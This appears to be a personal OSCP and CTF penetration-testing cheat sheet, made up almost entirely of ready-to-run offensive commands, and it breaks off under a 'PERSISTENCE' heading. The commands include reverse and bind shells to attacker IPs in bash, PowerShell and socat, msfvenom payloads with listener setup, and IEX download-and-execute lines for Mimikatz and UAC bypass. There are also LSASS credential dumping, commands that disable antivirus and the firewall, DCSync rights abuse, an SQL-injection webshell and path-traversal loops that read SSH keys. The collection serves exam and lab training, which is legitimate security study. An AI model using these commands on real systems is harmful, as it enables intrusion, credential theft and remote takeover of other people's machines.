

# OSCP / CTF


Enumerate SMB shares without credentials
```
smbclient -N -L \\\\<server_IP>\\
or
smbmap -d <domain> -L -H <IP>
```

Enumerating users on a Windows domain with rpcclient (without credentials)
```
rpcclient -U "" -N <ip>
rpcclient $> enumdomusers
rpcclient $> queryuser <user_RID>
rpcclient $> enumalsgroups builtin
rpcclient $> queryaliasmem builtin <RID>
        sid:[S-1-5-21-391775091-850290835-3566037492-1601]
rpcclient $> queryuser 1601


```

Bruteforcing SMB login with only usernames

```
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt

```

Connect to a Windows computer through Windows Remote Management (WinRM)

```
evil-winrm -i <ip> -u <username> -p '<password>'

```


get ldap with description and info attributes
```
ldapsearch -H ldap://10.10.10.169:3268 -x -LLL -s sub -b "DC=megabank,DC=local"

rpcclient -U "" -N 10.10.10.169
rpcclient $> enumdomusers
queryuser 0x457


smbclient -U melanie -L //10.10.10.169/
password reuse
smbclient -U melanie //10.10.10.169/NETLOGON Welcome123!

evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'

#search all files with word in it
ls -R -Hidden -EA SilentlyContinue | select-string ryan
```

HTB writeups
```
https://zweilosec.gitbook.io/htb-writeups/windows-machines/medium/resolute-write-up
```
```
Invoke-WebRequest -Uri "http://10.10.14.61:8000/PowerView.ps1" -OutFile "$env:temp\PowerView.ps1"
```

SCREEN TTY
```
ctrl+a d     detach
screen -ls
screen -r WEB   resume
screen -R WEB 	create
ctrl+a escape   scrollmode - hit escape again to escape
```

List all AD-Groups
```
Get-ADGroup -filter *

Paging - more - equi
Get-ADGroup -filter * | out-host -paging

show membership groups of account
get-netgroup -memberidentity svc-alfresco

Get-NetGroup "domain admins"

Get-ADGroupMember "Domain Admins" -recursive | Select-Object name

 Get-NetGroup | findstr -i samaccount

add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"

net user svc-alfresco /domain

net user buser Passw0rd /add /domain

net group "Exchange Windows Permissions" buser /add

net localgroup "Remote Management Users" buser /add



$password = ConvertTo-SecureString "Passw0rd" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('htb\buser', $password)
Add-ObjectAcl -PrincipalIdentity buser -Credential $cred  -Rights DCSync -Verbose


─$ impacket-psexec administrator@10.129.12.246 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
CyberChef
```
https://gchq.github.io/CyberChef/
```

OSCP LINKS
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools
```

```
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```

```
https://github.com/dipsec/Offensive-Security-OSCP-Cheatsheets-1/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying.md
```

RED TEAM AD KURS
```
#Find all machines on the current domain where the current user has local admin access
Test-AdminAccess –Verbose


#Tools
https://raw.githubusercontent.com/admin0987654321/admin1/master/Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess.ps1 
https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1
FindPSRemotingLocalAdminAccess.ps1


#Find local admins on all machines of the domain 
#(needs administrator privs on non-dc machines).
Find-DomainLocalGroupMember –Verbose


#Find computers where a domain admin (or specified user/group) has sessions:
Find-DomainUserLocation
Find-DomainUserLocation -GroupName "RDPUsers"


#To confirm admin access
Find-DomainUserLocation -CheckAccess


Find computers where a domain admin is logged-in.
Find-DomainUserLocation -Stealth
```



PrintSpoofer
```
PrintSpoofer.exe -d 1 -c cmd
```

Disable AV, FW
```
powershell -ep bypass
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableAVProtection $true
netsh advfirewall set allprofiles state off
```

AD commands
```
import-module .\SharpHound.ps1
import-module .\Powerview.ps1
or
. .\Powerview.ps1

Get-DomainUser -Name blaadmin

Get-DomainUser -SPN
Get-DomainUser -Properties samaccountname,memberof,description

whoami /groups

Get-DomainGroup =Name "Domain admins"

Get-Domain

Get-DomainGroup -Domain pentesting.local
Get-DomainGroupMember -Name "Domain Admins" -Recurse

Get-DomainGroup -Username "bladmin"

Get-DomainGPO -ComputerName student

Get-DomainOU

Find-DomainShare -Verbose

cd \\fileshare.pentesting.local\Fileshare

.\ADRecon.ps1 -OutputDir ALL-ADRecon -OutputType HTML

Add-DomainGroupMember -Identity 'Hidden' -Members 'student' -Domain 'pentesting'

Enter-PSSession -Computername dc01

Invoke-Command -ComputerName dc01 -ScriptBlock{whoami /groups;hostname}

import-module .\invoke-mimikatz.ps1

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'

net user student1 /domain
```


Portforwarding Tools
```
socat (source code)
this command listen on port 5050 and forward all to port 2020

socat tcp-l:5050,fork,reuseaddr tcp:127.0.0.1:2020
ncat readmore
Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable Netcat. It

ncat -l localhost 8080 --sh-exec "ncat example.org 80"
And you can use another tools:

goproxy: (download source code or bin file)
Listen on port 1234 and forward it to port 4567 on address "1.1.1.1"

./proxy tcp -p ":1234" -T tcp -P "1.1.1.1:4567"
gost (Download source code and bin) ENGLISH readme
Listen on port 1234 and forward it to port 4567 on address "1.1.1.1" source

./gost -L tcp://:1234/1.1.1.1:4567
redir (source code)

./redir :1234 1.1.1.1:5678
```

OSCP EXAM TIPS TRICKS
```

mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"

tree /f /a c:\users\

GodPotato-NET4.exe -cmd "cmd /c net user buser Passw0rd /add && net localgroup \"Remote Desktop users\" buser /add && net localgroup Administrators buser /add && reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"

bash -i >& /dev/tcp/192.168.45.167/80 0>&1

msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta
msfvenom -p windows/shell_bind_tcp lport=443 -f hta-psh > shell.hta
mshta http://192.168.45.214/shell.hta

start /B "" chisel-x64_w11.exe client 192.168.45.173:8001 R:1080:socks



```

GETPACK
```
└─$ cat getpack.bat               
@echo off
rem curl 192.168.45.181/getpack.bat -o %temp%\getpack.bat
set arg1=%1

rem curl %arg1%/getpack.zip 
rem powershell -command {Expand-Archive -Force $env:temp\getpack.zip $env:temp}

cd %temp%
curl %arg1%/mimikatz.exe -o %temp%\mimikatz.exe
curl %arg1%/chisel.exe -o %temp%\chisel.exe
curl %arg1%/godpotato.exe -o %temp%\godpotato.exe
curl %arg1%/nc.exe -o %temp%\nc.exe
curl %arg1%/mweb.exe -o %temp%\mweb.exe
curl %arg1%/mweb -o %temp%\mweb
curl %arg1%/psexec64.exe -o %temp%\psexec64.exe
curl %arg1%/pforward.exe -o %temp%\pforward.exe
curl %arg1%/ncat.exe -o %temp%\ncat.exe
curl %arg1%/winpeas.bat -o %temp%\winpeas.bat
curl %arg1%/letmein.bat -o %temp%\letmein.bat
curl %arg1%/linpeas.sh -o %temp%\linpeas.sh
curl %arg1%/getAllDomainGroups.ps1 -o %temp%\getAllDomainGroups.ps1
curl %arg1%/getListSPNS.ps1 -o %temp%\getListSPNS.ps1
curl %arg1%/Invoke-Kerberoast.ps1 -o %temp%\Invoke-Kerberoast.ps1
curl %arg1%/windows-privesc-check2.exe -o %temp%\windows-privesc-check2.exe




echo start /B "" chisel.exe client %arg1%:8001 R:1080:socks
echo mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
echo start /B "" pforward.exe -listenIP 0.0.0.0 -localPort 8080 -targetIP %arg1% -targetPort 80 
echo start /B "" run mweb.exe -port 8888
echo download: curl -O localhost:8080/download/test.txt
echo upload: curl -X POST -F "file=@AnyDesk.exe" http://localhost:8080/upload
echo psexec64.exe -accepteula \\ip cmd
echo godpotato.exe -cmd "cmd /c whoami" 

```




BASH TCP SHELL
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
../../../../../var/crash/test.php&cmd=/bin/bash -c ‘bash -i > /dev/tcp/IP/80 >&1’
../../../../../var/crash/test.php&cmd=/bin/bash%20-c%20%E2%80%98bash%20-i%20%3E%20/dev/tcp/IP/80%20%3E&1%E2%80%99%0A%0A%0A
```

ZeroLogon - CVE-2020-1472
```
https://github.com/SecuraBV/CVE-2020-1472
```

NMAP to HTML-Report
```
wget https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl

nmap -sS -T4 -A -sC -oA scanme --stylesheet nmap-bootstrap.xsl scanme.nmap.org scanme2.nmap.org

xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml
```

WINDOWS FILE TRANSFER
```
certutil.exe -urlcache -f "http://attackerIP/file.exe" file.exe
MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file]


$file-contents = Get-Content "filename.txt"
$file-encode = [System.Text.Encoding]::UTF8.GetBytes($file-contents)
[System.Convert]::ToBase64String($file-encode)

echo -n <base64String> | base64 -d > filename.txt
```

NMAP NSE
```
locate -r nse$|grep ldap

nmap -p 389 --script ldap-search -Pn 10.10.10.107
```

ELEVATE TO SYSTEM
```
PsExec.exe -s -i cmd.exe
```

NCAT - UD SHELL
```
[PsExec.exe -s -i cmd.exe](https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe)
```

ENUM USERS DOMAIN-CONTROLLER
```
nmap -p88 --script krb5-enum-users --script-args krb5-enumusers.realm="cyberspacekittens.local",userdb=/opt/userlist.txt <Domain Controller IP>
```

PASS THE HASH LOGIN
```
winexe -U <domain/username>%<password> //<targetIP> cmd.exe

pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
```

HASHCAT RULE
```
https://github.com/NotSoSecure/password_cracking_rules

.\hashcat.exe -m 1000 C:\hashcat\hashes\secrets.out E:\Wordlists\rockyou2021\rockyou2021.txt -r C:\hashcat\rules\OneRuleToRuleThemAll.rule -o cracked.txt

```

CRACKMAPEXEC PASSWORD SPRAYING
```
crackmapexec smb <targetIP> --pass-pol
crackmapexec smb <targetIP> --pass-pol -u '' -p ''


crackmapexec winrm <target> -u <user> -p <password>
If this returns Pwn3d, then you can leverage EvilWinRM to get the shell.
evil-winrm -i <target> -u <username> -p <password>
```

CHANGE PW REMOTE DC
```
If you’re able to get valid user credentials, but you’re unable to login because the password has expired and/or needs to be changed, you can leverage this tool in Kali Linux.

smbpasswd -U <username> -r <domainController>
```

EXPORT LIST DOMAIN-USERS
```
# store the results in an array.
$results = net group "Domain Users" /domain

# the size of the header and footer is always the same. select the data between these sections.
$results = $results[8..($results.Length-3)]

# replace the empty spaces with a comma. join on the comma, getting rid of blank lines.
foreach($result in $results) { 
    ($result -replace '\s+',',') -split ',' | ? { $_ } >> 'adusers.txt'
}
```

MSF-PAYLOAD
```
- msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python :: Windows
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe  :: Windows
- msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py :: MAC OS X  - 100%
- msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2 :: Mac OS X
- msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.4  LPORT=4444 -f macho > osx_cam.dmg 
- msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
- msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
- msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
- msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=consulting.example.org LPORT=4443 > metasploit_https.exe


[Establishing a Listener]

- MSFCONSOLE
    - use /exploit/multi/handler
	- set payload windows/meterpreter/reverse_tcp
	- set LHOST <IP>
	- set LPORT 4444
	- set ExitOnSession false
	- exploit -j -z
	- sessions -l
	- sessions -i 2
  
  
  - msfconsole -r msfremote_shell.rc

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 443
set ExitOnSession false
exploit -j

Staged Payloads for Windows

x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Stageless Payloads for Windows

x86	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Staged Payloads for Linux

x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
Stageless Payloads for Linux

x86	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
Non-Meterpreter Web Payloads
asp	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
Meterpreter Binaries
Staged Payloads for Windows

x86	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Stageless Payloads for Windows

x86	msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
Staged Payloads for Linux

x86	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
Stageless Payloads for Linux

x86	msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
Meterpreter Web Payloads
asp	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
php	msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

OTHER RESSOURCES
```
https://github.com/R0B1NL1N/OSCP-note
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://gtfobins.github.io/#%20+SUID
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
https://github.com/CountablyInfinite/oscp_cheatsheet
https://www.buaq.net/go-98074.html
https://blog.adithyanak.com/oscp-preparation-guide
https://ippsec.rocks/?#
https://medium.com/@GromHacks/guide-to-the-2022-oscp-exam-on-m1-with-active-directory-d8b4ce30f4f3
```

GENERAL EXPLOITS
```bash
Windows Server 2008 - MS09_050
Alternatively, since the target machine is running Windows Server 2008 sp1 32-bit, we could use the ms09_050_smb2_negotiate_func_index1 Metasploit Framework module.
```

FLAGS
```bash
"c:\\users\\administrator\\desktop\\proof.txt"
```

ENUM
```bash
#Portscan all Ports
nmap -sS -p- <ip>

#Portscan with Scripts and Fingerprinting
nmap -sS -sV -sC -p22,80,9000 <ip>

#nmap full and save out
nmap -sC -sV -p- -oA nmap/<box> 10.10.10.84

#Web Vuln-Scan
nikto -host 192.168.56.205

#web enum brute
dirb http://www.site.com -r -z 10

#Web Enum BruteForce
gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<host>
https://github.com/danielmiessler/SecLists
#big wordlist:
https://github.com/swisskyrepo/PayloadsAllTheThings
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/dirsearch.txt
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
gobuster -t 100 dir -w big.txt -u http://<host>
  
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/FUZZ -t 500
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/config/FUZZ -t 500 -mc 200

#curl brute / fuzz manual
while read line; do echo $line ; curl -s "http://10.10.11.154/index.php?page=/../../../..${line}"; done < fdbrute.txt

#ENUM processes
for i in {445..5000}; do echo $i >> procinfos.txt ;  curl -s "http://10.10.11.154/index.php?page=/../../../../proc/${i}/status" | wc -c >> procinfos.txt; done

#curl wordcount
curl -s "http://10.10.11.154/index.php?page=/../../../../proc/445/status" | wc -c

# bash number iterate
for i in {1000..5000}; do echo $i; curl -s "http://10.10.11.154/index.php?page=/../../../../proc/${i}/cmdline"; done

# bash iterate list
while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.ssh/id_rsa"; done < users.txt
while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.bash_history"; done < users.txt

# processes
ps auxwww

# POST-EXPLOITATION Discovery 
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net group "Domain Admins" /domain

```

EXPLOIT
```bash
#CVE / Exploit Search
searchsploit <name>
searchsploit -p <id>
cp <path> .

#Fuzzing 
python -c 'print("A" * 5000)' | nc <ip> <port>
  
#php shell command
"<?php system('id'); ?>"

#upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

#MSFVENOM

#MULTIHANDLER
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"

./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

#java
msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war > /home/kali/Desktop/shell.war

#linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf

#windows
msfvenom -p windows/meterpreter/reverse_https LHOST=172.28.23.16 LPORT=443 -e x86/shikata_ga_nai -i 5 -f dll > shellcode.dll

#php
msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.1.43 lport=4050 > /var/www/shell.txt

#python
msfvenom -p python/meterpreter/reverse_tcp LHOST = ANYIP LPORT= ANY PORT R> anyname.py

#c++
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c > meterpreter.c

#msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msiexec /quiet /qn /i C:\evil.msi

#reverse-shell x64 windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.45 LPORT=8888 -f c -b \x00\x0a\x0d

#messagebox
msfvenom -p windows/x64/messagebox TEXT=CoreThreat TITLE=PWN -f raw -o SHELLCODE_MESSAGE_BOX.bin

```

PRIVESC
```bash
# Tools / Script
https://www.securitysift.com/download/linuxprivchecker.py

#Cron
sudo -l
crontab -l
cat /etc/crontab

#su sudo
su root
sudo su
passwd root
su

#SUID BINARY
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

#Crack Password with John
unshadow passwd.txt shadow.txt > unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt

#Print files with the line number where the string is found
grep -rnw '/' -ie 'password' --color=always

#Find files with SUID permission
find / -perm -4000 -type f 2>/dev/null

#Find files with open permissions
find / -perm -777 -type f 2>/dev/null

#Find files with SUID permission for current user
    find / perm /u=s -user `whoami` 2>/dev/null
    find / -user root -perm -4000 -print 2>/dev/null

#Find files with writable permission for current user or current group
    find / perm /u=w -user `whoami` 2>/dev/null
    find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
    find / -perm /u+w -user `whoami` 2>/dev/nul

#Find directories with writable permissions for current user or current group
    find / perm /u=w -type -d -user `whoami` 2>/dev/null
    find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
    
#Post Exploit Enumeration
    grep -rnw '/' -ie 'pass' --color=always
    grep -rnw '/' -ie 'DB_PASS' --color=always
    grep -rnw '/' -ie 'DB_PASSWORD' --color=always
    grep -rnw '/' -ie 'DB_USER' --color=always

#lsass minidump com
"rundll32 C:\windows\system32\comsvcs.dll MiniDump "1234 dump.bin full""
rundll32.exe  comsvcs.dll,#24 600 C:\Users\user\Desktop\lsass.dmp full

#nanodump lsass
https://github.com/helpsystems/nanodump

#load pe in memory avoid av edr detection
https://github.com/D1rkMtr/FilelessRemotePE

# mimikatz param
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
```

FILETRANSFER
```bash
#File Upload on linux systems via base64 encoding
#Converting a file to base64:
cat file2upload | base64

#Once the file is converted to base64, you can just create a new file on the remote system and copy the base64 output of the above file into it. Next step would be to reverse the base64 to binary
cat fileWithBase64Content | base64 -d > finalBinary

bitsadmin /transfer evil.exe /download /priority high https://wslab.de/tools/nc.exe %temp%\evil.exe & start /wait %temp%\evil.exe -l -p 3333 -e cmd & del %temp%\evil.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Deskto p\wget.exe')"

sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

POWERSHELL
```bash

# execution policy
Set-ExecutionPolicy Unrestricted
Get-ExecutionPolicy

# PS REVERSESHELL
sudo nc -lnvp 443
#reverseshell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443); $stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush(); }
$client.Close();

#oneliner
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush();}$client.Close()"


# BIND SHELL
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client =
$listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =
(iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close();$listener.Stop()"


# Description: 
#    Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.

# Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

# Invoke-Inveigh and log output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe

# Insert reg key to enable Wdigest on newer versions of Windows
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
```


REVERSESHELLS
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,se
```

ENCODING/DECODING
```bash
#bash urlencode
echo $( php -r "echo urlencode('Start: #1, Zeichen {13/24} Ende();');"; )
#!/bin/bash
echo $( php -r "echo urlencode(\"$1\");"; )
urlencode.sh 'string zum encodieren'
```

PHP
```bash
#build in webserver
php -S 0.0.0.0:8000

# create sqli to php webshell
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

Busybox
```bash
busybox httpd -f -p 10000
```

LFI
```bash
http://10.10.0.22/menu.php?file=data:text/plain,hello world
http://10.10.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

SQLI
```bash
sqlmap -u http://10.10.0.22/debug.php?id=1 -p "id"
sqlmap -u http://10.10.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
```

MARIADB SQLi
```bash
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
```

POSTGRES
```bash
$ psql -h 192.168.147.47 -U postgres -p 5437
```

PERSISTENCE
```bash
# netcat run registry
